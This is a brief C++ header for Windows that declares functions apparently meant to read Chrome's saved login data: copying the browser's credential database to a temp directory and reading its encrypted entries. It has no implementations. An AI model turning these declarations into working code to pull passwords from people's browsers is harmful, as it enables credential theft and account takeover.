#pragma once
#include "windows.h"
#include "string"
using std::string;
using std::wstring;
void  ReadChromeLoginData(DWORD ID);
wstring ReadEncryptData(const std::string &sLoginDataPath);
bool CopyDataBaseToTempDir(const std::string &sDBPath, std::string &sTempDBPath);
